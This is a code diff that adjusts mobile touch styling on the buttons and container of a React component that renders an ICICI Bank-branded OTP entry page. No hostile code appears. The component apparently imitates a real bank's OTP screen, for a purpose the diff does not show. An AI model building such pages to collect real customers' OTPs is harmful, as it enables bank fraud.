@@ -131,7 +131,7 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
   }
 
   return (
-    <div className="bg-white font-sans w-full max-w-sm mx-auto border border-gray-200 shadow-lg">
+    <div className="bg-white font-sans w-full max-w-sm mx-auto border border-gray-200 shadow-lg" style={{ touchAction: 'auto', WebkitTouchCallout: 'default', userSelect: 'text' }}>
       {/* Header with logos */}
       <div className="flex justify-between items-center px-3 py-2 border-b border-gray-100">
         <img 
@@ -232,7 +232,8 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
             <button
               type="submit"
               disabled={otpValue.length !== 6 || otpSubmitting || isExpired}
-              className="flex-1 bg-blue-600 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-blue-700 transition-colors rounded"
+              className="flex-1 bg-blue-600 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-blue-700 transition-colors rounded touch-manipulation"
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
             >
               {otpSubmitting ? 'CONFIRMING...' : 'CONFIRM'}
             </button>
@@ -241,7 +242,8 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
               type="button"
               onClick={handleOtpCancel}
               disabled={otpSubmitting}
-              className="flex-1 bg-gray-500 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors rounded"
+              className="flex-1 bg-gray-500 text-white py-2 px-4 font-semibold text-xs disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors rounded touch-manipulation"
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
             >
               CANCEL
             </button>
@@ -251,8 +253,9 @@ const ICICIBankOTPPage: React.FC<ICICIBankOTPPageProps> = ({
           <div className="text-center mb-3">
             <button
               type="button"
-              className="text-blue-600 font-semibold text-xs hover:text-blue-800 transition-colors"
+              className="text-blue-600 font-semibold text-xs hover:text-blue-800 transition-colors touch-manipulation"
               disabled={otpSubmitting}
+              style={{ touchAction: 'manipulation', WebkitTapHighlightColor: 'transparent' }}
             >
               RESEND
             </button>
